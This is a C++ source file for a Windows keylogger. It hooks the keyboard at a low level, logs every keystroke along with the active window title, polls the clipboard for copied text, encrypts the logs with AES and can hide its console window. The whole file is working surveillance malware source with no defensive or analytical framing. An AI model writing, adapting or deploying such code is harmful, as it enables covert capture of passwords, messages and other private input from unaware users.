#include <fstream>
#include "json.hpp"
#include "keylogger.hpp"
#include "config.hpp"
#include <iostream>
#include <sstream>
#include <ctime>
#include <map>
#include <windows.h>
#include "keylabels.cpp"
#include "logsEncryption.hpp"
#include <thread>
#include <chrono>
#include <mutex>
#include "logger_utils.hpp" // for extern std::mutex log_mutex

const Config* g_config_ptr = nullptr;

Keylogger::Keylogger(const std::string& filename, const Config& config) : config(&config) {
    logFile.open(filename, std::ios_base::app);
    hookHandle = nullptr;
    memset(lastWindow, 0, sizeof(lastWindow));
}

Keylogger::~Keylogger() {
    RemoveHook();
    if (logFile.is_open()) logFile.close();
}

void Keylogger::InstallHook() {
    hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, nullptr, 0);
    if (!hookHandle) {
        MessageBoxA(nullptr, "Failed to install hook!", "Error", MB_ICONERROR);
    }
}

void Keylogger::RemoveHook() {
    if (hookHandle) {
        UnhookWindowsHookEx(hookHandle);
        hookHandle = nullptr;
    }
}

void Keylogger::RunClipboardMonitor(const Config* config) {
    ClipboardMonitorThread(config);
}

void Keylogger::ClipboardMonitorThread(const Config* config) {
    std::string lastClipboard;
    while (true) {
        if (OpenClipboard(nullptr)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char* pszText = static_cast<char*>(GlobalLock(hData));
                if (pszText) {
                    std::string clipboardText(pszText);
                    GlobalUnlock(hData);
                    if (!clipboardText.empty() && clipboardText != lastClipboard) {
                        lastClipboard = clipboardText;
                        HWND activeWindow = GetForegroundWindow();
                        char windowTitle[256] = "Unknown";
                        if (activeWindow) {
                            GetWindowTextA(activeWindow, windowTitle, sizeof(windowTitle));
                        }
                        time_t t = time(nullptr);
                        struct tm timeInfo;
                        localtime_s(&timeInfo, &t);
                        char timeStr[64];
                        strftime(timeStr, sizeof(timeStr), "%Y-%m-%dT%H:%M:%S", &timeInfo);
                        nlohmann::json logEntry = {
                            {"timestamp", std::string(timeStr)},
                            {"key", std::string("%ClipBoardText%"+clipboardText)},
                            {"window", std::string(windowTitle)}
                        };
                        std::lock_guard<std::mutex> lock(log_mutex);
                        std::ofstream logFile(config->log_file_name, std::ios_base::app);
                        std::string encryptedLog = encryptAES_CBC(logEntry.dump());
                        logFile << encryptedLog << "\n";
                        logFile.flush();
                    }
                }
            }
            CloseClipboard();
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}

void Keylogger::Run() {
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {}
}

LRESULT CALLBACK Keylogger::HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* kbData = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        if (wParam == WM_KEYDOWN) {
            GetInstance().LogKeystroke(kbData->vkCode, true);
        } else if (wParam == WM_KEYUP) {
            GetInstance().LogKeystroke(kbData->vkCode, false);
        }
    }
    return CallNextHookEx(GetInstance().hookHandle, nCode, wParam, lParam);
}

void Keylogger::LogKeystroke(int vkCode, bool isKeyDown) {
    if (config->mouse_ignore) {
        if (vkCode == 1 || vkCode == 2) return;
    }

    // Handle key press/release for modifier keys
    if (isKeyDown) {
        // Only log if this key wasn't already pressed
        if (pressedKeys.find(vkCode) == pressedKeys.end()) {
            pressedKeys.insert(vkCode);
            LogKey(vkCode);
        }
    } else {
        // Remove from pressed keys set
        pressedKeys.erase(vkCode);
    }
}

void Keylogger::LogKey(int vkCode) {
    HWND activeWindow = GetForegroundWindow();
    DWORD threadId = 0;
    HKL keyboardLayout = nullptr;
    char windowTitle[256] = "Unknown";
    if (activeWindow) {
        threadId = GetWindowThreadProcessId(activeWindow, nullptr);
        keyboardLayout = GetKeyboardLayout(threadId);
        GetWindowTextA(activeWindow, windowTitle, sizeof(windowTitle));
    }
    std::stringstream keyLabel;
    if (config->format == 10) {
        keyLabel << vkCode;
    } else if (config->format == 16) {
        keyLabel << std::hex << vkCode;
    } else {
        extern const std::map<int, std::string> keyLabels;
        if (keyLabels.count(vkCode)) {
            keyLabel << keyLabels.at(vkCode);
        } else {
            char ch = MapVirtualKeyExA(vkCode, MAPVK_VK_TO_CHAR, keyboardLayout);
            bool isLowercase = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            if (GetKeyState(VK_SHIFT) & 0x8000) isLowercase = !isLowercase;
            if (!isLowercase) ch = tolower(ch);
            keyLabel << ch;
        }
    }
    time_t t = time(nullptr);
    struct tm timeInfo;
    localtime_s(&timeInfo, &t);
    char timeStr[64];
    // Format: YYYY-MM-DDTHH:MM:SS (IST time without timezone name)
    strftime(timeStr, sizeof(timeStr), "%Y-%m-%dT%H:%M:%S", &timeInfo);
    nlohmann::json logEntry = {
        {"timestamp", std::string(timeStr)},
        {"key", keyLabel.str()},
        {"window", std::string(windowTitle)}
    };
    // logFile << logEntry.dump() << "\n";
    std::string encryptedLog = encryptAES_CBC(logEntry.dump());
    logFile << encryptedLog << "\n";
    logFile.flush();
}

void Keylogger::SetConsoleVisibility(const Config& config) {
    if (!config.visible) {
        ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_HIDE);
        FreeConsole();
    } else {
        ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_SHOW);
    }
}

bool Keylogger::IsSystemBooting(const Config& config) {
    // You can use config.boot_wait if you want to change logic
    return false;
}

Keylogger& Keylogger::GetInstance(const Config& config) {
    static Keylogger instance(config.log_file_name, config);
    return instance;
}

Keylogger& Keylogger::GetInstance() {
    if (!g_config_ptr) throw std::runtime_error("Config pointer not set");
    return GetInstance(*g_config_ptr);
} 